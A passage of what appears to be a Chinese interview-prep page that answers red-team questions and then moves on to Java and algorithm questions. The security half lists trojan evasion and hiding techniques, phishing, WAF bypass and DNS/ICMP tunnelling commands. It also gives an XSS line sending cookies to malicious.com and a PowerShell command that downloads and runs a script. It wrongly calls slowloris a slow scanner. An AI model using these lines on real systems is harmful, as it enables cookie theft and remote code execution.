一致，可能为泛解析。</li></ul></li></ol><h2 id="Python-实现："><a href="#Python-实现：" class="headerlink" title="Python 实现："></a><strong>Python 实现</strong>：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dns.resolver</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_wildcard</span>(<span class="params">domain</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        test_subdomain = <span class="string">f&quot;random-test.<span class="subst">&#123;domain&#125;</span>&quot;</span></span><br><span class="line">        answer = dns.resolver.resolve(test_subdomain, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> answer.rrset <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>  <span class="comment"># 有解析结果，则为泛解析</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">domain_list = [<span class="string">&quot;example.com&quot;</span>, <span class="string">&quot;wildcard.example.com&quot;</span>]</span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> domain_list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;domain&#125;</span>: <span class="subst">&#123;<span class="string">&#x27;泛解析&#x27;</span> <span class="keyword">if</span> is_wildcard(domain) <span class="keyword">else</span> <span class="string">&#x27;非泛解析&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></h2><h3 id="木马免杀有哪些方式？哪种方式最有效？"><a href="#木马免杀有哪些方式？哪种方式最有效？" class="headerlink" title="木马免杀有哪些方式？哪种方式最有效？"></a><strong>木马免杀有哪些方式？哪种方式最有效？</strong></h3><p><strong>免杀方式</strong>：</p><ol><li><strong>代码混淆</strong>：<ul><li>变异代码，绕过特征检测。</li></ul></li><li><strong>加壳</strong>：<ul><li>使用 <code>Themida</code>、<code>VMProtect</code> 进行保护。</li></ul></li><li><strong>内存加载</strong>：<ul><li>不落地文件，直接在内存运行。</li></ul></li></ol><p><strong>最有效方式</strong>：</p><ul><li><strong>内存加载 + 自定义加密 + 多态变种</strong>。</li></ul><hr><h3 id="木马隐藏有哪些？哪种隐藏方式当前最有效？"><a href="#木马隐藏有哪些？哪种隐藏方式当前最有效？" class="headerlink" title="木马隐藏有哪些？哪种隐藏方式当前最有效？"></a><strong>木马隐藏有哪些？哪种隐藏方式当前最有效？</strong></h3><p><strong>常见隐藏方式</strong>：</p><ol><li><strong>进程注入</strong>：<ul><li>注入 <code>explorer.exe</code>，隐藏自身。</li></ul></li><li><strong>Rootkit 技术</strong>：<ul><li>Hook <code>kernel</code> 级函数，隐藏进程。</li></ul></li><li><strong>无文件攻击</strong>：<ul><li>通过 <code>PowerShell</code> 运行，无落地文件。</li></ul></li></ol><p><strong>最有效方式</strong>：</p><ul><li><strong>无文件 + 内存驻留 + 进程注入</strong>。</li></ul><hr><h3 id="Word-DDE-和-Office-宏有什么优势？"><a href="#Word-DDE-和-Office-宏有什么优势？" class="headerlink" title="Word DDE 和 Office 宏有什么优势？"></a><strong>Word DDE 和 Office 宏有什么优势？</strong></h3><table><thead><tr><th><strong>攻击方式</strong></th><th><strong>优势</strong></th></tr></thead><tbody><tr><td><strong>DDE（动态数据交换）</strong></td><td>无需启用宏，可自动执行命令</td></tr><tr><td><strong>Office 宏</strong></td><td>可执行恶意 VBA 代码，权限较高</td></tr></tbody></table><p><strong>最佳利用</strong>：</p><ul><li><strong>DDE 可绕过宏限制</strong>，适用于目标防御较弱的环境。</li></ul><hr><h3 id="如何绕过-Office-受保护视图？"><a href="#如何绕过-Office-受保护视图？" class="headerlink" title="如何绕过 Office 受保护视图？"></a><strong>如何绕过 Office 受保护视图？</strong></h3><p><strong>绕过方式</strong>：</p><ol><li>**使用 <code>LNK</code> 结合 <code>VBA</code>**：<ul><li><code>.lnk -&gt; Word 宏 -&gt; PowerShell 执行</code>。</li></ul></li><li><strong>嵌入远程 <code>RTF</code> 文件</strong>：<ul><li>触发 <code>OLE</code> 机制绕过安全检测。</li></ul></li></ol><hr><h3 id="有哪些有效的钓鱼方式？"><a href="#有哪些有效的钓鱼方式？" class="headerlink" title="有哪些有效的钓鱼方式？"></a><strong>有哪些有效的钓鱼方式？</strong></h3><ol><li><strong>HTML Smuggling</strong>：<ul><li>直接 <code>JS</code> 生成 <code>EXE</code>，绕过下载检测。</li></ul></li><li><strong>OAuth 伪装</strong>：<ul><li>假冒 <code>Google/Microsoft</code> 登录，骗取凭据。</li></ul></li><li><strong>智能 DNS 诱导</strong>：<ul><li>伪造 <code>Wi-Fi</code> 认证页面，获取凭据。</li></ul></li></ol><hr><h3 id="如何绕过-WAF、HIDS、威胁感知？"><a href="#如何绕过-WAF、HIDS、威胁感知？" class="headerlink" title="如何绕过 WAF、HIDS、威胁感知？"></a><strong>如何绕过 WAF、HIDS、威胁感知？</strong></h3><table><thead><tr><th><strong>目标</strong></th><th><strong>绕过方式</strong></th></tr></thead><tbody><tr><td><strong>WAF</strong></td><td>使用 <code>编码绕过</code>（如 <code>Base64</code>）</td></tr><tr><td><strong>HIDS</strong></td><td>代码注入，隐藏进程</td></tr><tr><td><strong>威胁感知</strong></td><td>伪装 <code>User-Agent</code>，避免流量特征匹配</td></tr></tbody></table><hr><h3 id="如何在禁止出网的机器上访问互联网？"><a href="#如何在禁止出网的机器上访问互联网？" class="headerlink" title="如何在禁止出网的机器上访问互联网？"></a><strong>如何在禁止出网的机器上访问互联网？</strong></h3><p><strong>绕过方式</strong>：</p><ol><li><strong>DNS 隧道</strong>：<ul><li>通过 <code>iodine</code> 将数据封装进 DNS 查询：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iodine -f -P password my.dnstunnel.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>ICMP 隧道</strong>：<ul><li>使用 <code>Ptunnel</code> 通过 ICMP 传输 TCP 流量：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -c -p 192.168.1.1 -lp 8000 -da target.com -dp 80</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>蓝牙&#x2F;手机热点</strong>：<ul><li>利用手机创建热点，物理绕过网络限制。</li></ul></li></ol><hr><h3 id="ew、frp-差异？"><a href="#ew、frp-差异？" class="headerlink" title="ew、frp 差异？"></a><strong>ew、frp 差异？</strong></h3><table><thead><tr><th><strong>工具</strong></th><th><strong>作用</strong></th><th><strong>优点</strong></th><th><strong>缺点</strong></th></tr></thead><tbody><tr><td><strong>ew</strong></td><td>反向代理</td><td>轻量级、无依赖</td><td>功能较少</td></tr><tr><td><strong>frp</strong></td><td>内网穿透</td><td>支持 TCP、UDP、HTTP</td><td>需要公网服务器</td></tr></tbody></table><hr><h3 id="ICMP-如何出网？"><a href="#ICMP-如何出网？" class="headerlink" title="ICMP 如何出网？"></a><strong>ICMP 如何出网？</strong></h3><p><strong>ICMP 隧道方式</strong>：</p><ol><li>**使用 <code>Ptunnel</code>**：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -c -p 192.168.1.1 -lp 8080 -da google.com -dp 443</span><br></pre></td></tr></table></figure></li><li>**使用 <code>icmptx</code>**：<ul><li>在封锁 TCP&#x2F;UDP 但允许 ICMP 的环境下进行数据传输。</li></ul></li></ol><hr><h3 id="如何利用-XSS-让影响最大化？"><a href="#如何利用-XSS-让影响最大化？" class="headerlink" title="如何利用 XSS 让影响最大化？"></a><strong>如何利用 XSS 让影响最大化？</strong></h3><p><strong>扩大 XSS 影响的方式</strong>：</p><ol><li><strong>蠕虫化传播</strong>：<ul><li>利用 XSS 自动感染更多用户：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;http://malicious.com/log?cookie=&quot;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>结合 CSRF</strong>：<ul><li>让受害者执行管理员操作：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://victim.com/delete?user=admin&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><strong>劫持 <code>WebSocket</code> 连接</strong>：<ul><li>控制用户浏览器发送恶意请求。</li></ul></li></ol><hr><h3 id="如何全流程最大限度降低被红军发现概率？"><a href="#如何全流程最大限度降低被红军发现概率？" class="headerlink" title="如何全流程最大限度降低被红军发现概率？"></a><strong>如何全流程最大限度降低被红军发现概率？</strong></h3><p><strong>降低被发现的方法</strong>：</p><ol><li><strong>减少网络异常行为</strong>：<ul><li>避免高频端口扫描，使用 <code>slowloris</code> 低速扫描：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 22,80,443 -T2 target.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>混淆指纹</strong>：<ul><li>伪装 <code>User-Agent</code>、<code>TLS Fingerprint</code>：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -A <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot;</span> https://target.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>避免持久化</strong>：<ul><li>使用 <code>fileless</code> 技术，如 <code>PowerShell</code> 直接运行：<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span>(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://malicious.com/script.ps1&quot;</span>)</span><br></pre></td></tr></table></figure></li></ul></li><li>**使用 <code>Covert Channel</code>**：<ul><li>通过 DNS、ICMP 通道回传数据，避免直接暴露 IP。</li></ul></li></ol><hr><h2 id="安全开发岗位"><a href="#安全开发岗位" class="headerlink" title="安全开发岗位"></a>安全开发岗位</h2><h3 id="equals-与-的区别"><a href="#equals-与-的区别" class="headerlink" title="equals 与 &#x3D;&#x3D; 的区别"></a><strong>equals 与 &#x3D;&#x3D; 的区别</strong></h3><table><thead><tr><th><strong>运算符&#x2F;方法</strong></th><th><strong>比较内容</strong></th><th><strong>适用类型</strong></th></tr></thead><tbody><tr><td><code>==</code></td><td>比较 <strong>引用地址</strong>（基本数据类型则比较值）</td><td>基本类型、对象引用</td></tr><tr><td><code>equals()</code></td><td>比较 <strong>对象内容</strong>（需重写 <code>equals</code> 方法）</td><td>仅适用于对象</td></tr></tbody></table><p><strong>示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">System.out.println(a == b);        <span class="comment">// false （不同对象）</span></span><br><span class="line">System.out.println(a.equals(b));   <span class="comment">// true （内容相同）</span></span><br></pre></td></tr></table></figure><hr><h3 id="Java-虚拟机区域如何划分？"><a href="#Java-虚拟机区域如何划分？" class="headerlink" title="Java 虚拟机区域如何划分？"></a><strong>Java 虚拟机区域如何划分？</strong></h3><p><strong>JVM 内存结构</strong>：</p><ol><li><strong>堆（Heap）</strong>：<ul><li>存储对象实例，垃圾回收器管理。</li></ul></li><li><strong>方法区（Metaspace）</strong>：<ul><li>存储类元信息、常量池。</li></ul></li><li><strong>虚拟机栈（JVM Stack）</strong>：<ul><li>线程私有，存储局部变量、方法调用帧。</li></ul></li><li><strong>本地方法栈（Native Stack）</strong>：<ul><li>调用 <code>JNI</code> 代码时使用。</li></ul></li><li><strong>程序计数器（PC Register）</strong>：<ul><li>记录当前执行的字节码指令。</li></ul></li></ol><hr><h3 id="方法重载与方法重写的区别"><a href="#方法重载与方法重写的区别" class="headerlink" title="方法重载与方法重写的区别"></a><strong>方法重载与方法重写的区别</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>方法重载（Overloading）</strong></th><th><strong>方法重写（Overriding）</strong></th></tr></thead><tbody><tr><td><strong>定义</strong></td><td>相同方法名，不同参数列表</td><td>子类修改父类方法实现</td></tr><tr><td><strong>作用</strong></td><td>提供多种调用方式</td><td>实现多态</td></tr><tr><td><strong>访问权限</strong></td><td>无需与原方法一致</td><td>不能降低父类方法权限</td></tr></tbody></table><p><strong>示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法重载</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MathUtil</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">    <span class="type">double</span> <span class="title function_">sum</span><span class="params">(<span class="type">double</span> a, <span class="type">double</span> b)</span> &#123; <span class="keyword">return</span> a + b; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法重写</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Parent&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123; System.out.println(<span class="string">&quot;Child&quot;</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="HashMap、HashTable、ConcurrentHashMap-的区别"><a href="#HashMap、HashTable、ConcurrentHashMap-的区别" class="headerlink" title="HashMap、HashTable、ConcurrentHashMap 的区别"></a><strong>HashMap、HashTable、ConcurrentHashMap 的区别</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>HashMap</strong></th><th><strong>HashTable</strong></th><th><strong>ConcurrentHashMap</strong></th></tr></thead><tbody><tr><td><strong>线程安全</strong></td><td>❌ 非线程安全</td><td>✅ 线程安全（同步方法）</td><td>✅ 线程安全（分段锁）</td></tr><tr><td><strong>性能</strong></td><td>高</td><td>低</td><td>高</td></tr><tr><td><strong>是否允许 <code>null</code></strong></td><td><code>key/value</code> 都允许</td><td><code>key/value</code> 都不允许</td><td>仅 <code>value</code> 允许</td></tr></tbody></table><hr><h3 id="进程和线程区别，线程间通信有哪些方式？"><a href="#进程和线程区别，线程间通信有哪些方式？" class="headerlink" title="进程和线程区别，线程间通信有哪些方式？"></a><strong>进程和线程区别，线程间通信有哪些方式？</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>进程</strong></th><th><strong>线程</strong></th></tr></thead><tbody><tr><td><strong>定义</strong></td><td>独立运行的程序实例</td><td>进程内的执行单元</td></tr><tr><td><strong>内存共享</strong></td><td>❌ 不共享</td><td>✅ 共享进程内存</td></tr><tr><td><strong>创建开销</strong></td><td>高</td><td>低</td></tr></tbody></table><p><strong>线程间通信方式</strong>：</p><ol><li><strong>共享内存</strong>（<code>volatile</code>、<code>synchronized</code>）</li><li><strong>消息队列</strong>（<code>BlockingQueue</code>）</li><li><strong>管道通信</strong>（<code>PipedInputStream</code>、<code>PipedOutputStream</code>）</li></ol><hr><h3 id="Java-BIO-NIO-AIO-是什么？适用哪些场景？"><a href="#Java-BIO-NIO-AIO-是什么？适用哪些场景？" class="headerlink" title="Java BIO&#x2F;NIO&#x2F;AIO 是什么？适用哪些场景？"></a><strong>Java BIO&#x2F;NIO&#x2F;AIO 是什么？适用哪些场景？</strong></h3><table><thead><tr><th><strong>类型</strong></th><th><strong>特点</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr><td><strong>BIO（同步阻塞）</strong></td><td>一个线程处理一个连接</td><td>低并发（如传统 <code>Socket</code>）</td></tr><tr><td><strong>NIO（同步非阻塞）</strong></td><td>采用 <code>Selector</code> 监听多连接</td><td>高并发（如 <code>Netty</code>）</td></tr><tr><td><strong>AIO（异步非阻塞）</strong></td><td><code>OS</code> 回调处理数据</td><td>超高并发（如 <code>WebSocket</code>）</td></tr></tbody></table><hr><h3 id="挑一个设计模式（工厂、单例、适配器、观察者）进行讲解"><a href="#挑一个设计模式（工厂、单例、适配器、观察者）进行讲解" class="headerlink" title="挑一个设计模式（工厂、单例、适配器、观察者）进行讲解"></a><strong>挑一个设计模式（工厂、单例、适配器、观察者）进行讲解</strong></h3><h4 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a><strong>单例模式</strong></h4><p><strong>作用</strong>：</p><ul><li>确保全局仅有一个实例，避免资源浪费。</li></ul><p><strong>实现方式</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton instance;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>应用场景</strong>：</p><ul><li><strong>数据库连接池</strong></li><li><strong>日志管理器</strong></li></ul><hr><h3 id="synchronized-如何使用？Object-的-wait、notify-方法有什么作用？"><a href="#synchronized-如何使用？Object-的-wait、notify-方法有什么作用？" class="headerlink" title="synchronized 如何使用？Object 的 wait、notify 方法有什么作用？"></a><strong>synchronized 如何使用？Object 的 wait、notify 方法有什么作用？</strong></h3><p><strong>synchronized 作用</strong>：</p><ul><li>线程同步，避免数据竞争。</li></ul><p><strong>wait&#x2F;notify 作用</strong>：</p><ul><li><code>wait()</code>：线程进入 <strong>等待状态</strong>，释放锁。</li><li><code>notify()</code>：唤醒一个等待的线程。</li></ul><p><strong>示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">WaitNotifyExample</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Object</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">waitMethod</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Waiting...&quot;</span>);</span><br><span class="line">            lock.wait();  <span class="comment">// 线程进入等待</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Notified!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">notifyMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (lock) &#123;</span><br><span class="line">            lock.notify();  <span class="comment">// 唤醒等待的线程</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="sleep-和-wait-有什么区别？"><a href="#sleep-和-wait-有什么区别？" class="headerlink" title="sleep() 和 wait() 有什么区别？"></a><strong>sleep() 和 wait() 有什么区别？</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>sleep()</strong></th><th><strong>wait()</strong></th></tr></thead><tbody><tr><td><strong>定义</strong></td><td>让线程暂停执行</td><td>让线程进入等待队列</td></tr><tr><td><strong>是否释放锁</strong></td><td>❌ 不释放</td><td>✅ 释放</td></tr><tr><td><strong>使用范围</strong></td><td>任意地方</td><td>只能在 <code>synchronized</code> 代码块</td></tr></tbody></table><p><strong>示例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thread.sleep(<span class="number">1000</span>);  <span class="comment">// 线程暂停 1s</span></span><br><span class="line"><span class="keyword">synchronized</span> (lock) &#123; lock.wait(); &#125;  <span class="comment">// 释放锁，等待 notify</span></span><br></pre></td></tr></table></figure><hr><h3 id="什么是幂等性？一般有什么方式实现？"><a href="#什么是幂等性？一般有什么方式实现？" class="headerlink" title="什么是幂等性？一般有什么方式实现？"></a><strong>什么是幂等性？一般有什么方式实现？</strong></h3><p><strong>定义</strong>：</p><ul><li><strong>重复执行多次，不影响最终结果</strong>。</li></ul><p><strong>实现方式</strong>：</p><ol><li><strong>基于数据库唯一约束</strong>：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> orders(id, <span class="keyword">user</span>, amount) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;Alice&#x27;</span>, <span class="number">100</span>) <span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> amount<span class="operator">=</span>amount;</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>Token</code> 机制</strong>：<ul><li>避免重复提交：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (redis.exists(requestToken)) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line">redis.set(requestToken, <span class="string">&quot;1&quot;</span>, <span class="number">5</span>, TimeUnit.MINUTES);</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>幂等接口设计</strong>：<ul><li><code>PUT</code> 请求应更新资源，而非创建新资源。</li></ul></li></ol><hr><h3 id="大文件小内存的排序如何做？"><a href="#大文件小内存的排序如何做？" class="headerlink" title="大文件小内存的排序如何做？"></a><strong>大文件小内存的排序如何做？</strong></h3><p><strong>外部排序（External Sorting）</strong>：</p><ol><li><strong>分块排序</strong>：<ul><li>将大文件拆分成多个小文件（每个可放入内存）。</li><li>使用 <code>快速排序</code> 或 <code>归并排序</code> 对小文件排序。</li></ul></li><li><strong>多路归并（K-Way Merge）</strong>：<ul><li>归并排序后的小文件，利用 <strong>最小堆</strong> 进行合并：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sorted_part1.txt&quot;</span>) <span class="keyword">as</span> f1, <span class="built_in">open</span>(<span class="string">&quot;sorted_part2.txt&quot;</span>) <span class="keyword">as</span> f2:</span><br><span class="line">    merged = heapq.merge(f1, f2)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;final_sorted.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> out:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> merged:</span><br><span class="line">            out.write(line)</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>适用算法</strong>：</p><ul><li><strong>归并排序（Merge Sort）</strong>，适合大文件分块处理。</li><li><strong>基数排序（Radix Sort）</strong>，适合整数排序。</li></ul><hr><h3 id="有-1-亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。"><a href="#有-1-亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。" class="headerlink" title="有 1 亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。"></a><strong>有 1 亿个数字，其中有两个是重复的，如何快速找到？要求时间和空间最优。</strong></h3><p><strong>解法 1：位图法（BitMap）</strong>（空间 O(N&#x2F;8)，时间 O(N)）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bit_array = [<span class="number">0</span>] * (<span class="number">10</span>**<span class="number">8</span> // <span class="number">8</span>)  <span class="comment"># 每个 bit 代表一个数</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">    index, offset = <span class="built_in">divmod</span>(num, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">if</span> (bit_array[index] &gt;&gt; offset) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;重复数字:&quot;</span>, num)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bit_array[index] |= (<span class="number">1</span> &lt;&lt; offset)</span><br></pre></td></tr></table></figure><p><strong>解法 2：哈希集合</strong>（空间 O(N)，时间 O(N)）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">seen = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">in</span> seen:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;重复数字:&quot;</span>, num)</span><br><span class="line">    seen.add(num)</span><br></pre></td></tr></table></figure><p><strong>解法 3：排序 + 相邻比较</strong>（空间 O(1)，时间 O(N log N)）</p><ul><li>使用外部排序（归并&#x2F;快速排序），然后遍历找相同数字。</li></ul><hr><h3 id="1-亿个随机生成的无序整数，找出中间大小的值。"><a href="#1-亿个随机生成的无序整数，找出中间大小的值。" class="headerlink" title="1 亿个随机生成的无序整数，找出中间大小的值。"></a><strong>1 亿个随机生成的无序整数，找出中间大小的值。</strong></h3><p><strong>解法 1：快速选择（QuickSelect，O(N)）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partition</span>(<span class="params">arr, left, right</span>):</span><br><span class="line">    pivot = arr[right]</span><br><span class="line">    i = left</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(left, right):</span><br><span class="line">        <span class="keyword">if</span> arr[j] &lt; pivot:</span><br><span class="line">            arr[i], arr[j] = arr[j], arr[i]</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    arr[i], arr[right] = arr[right], arr[i]</span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 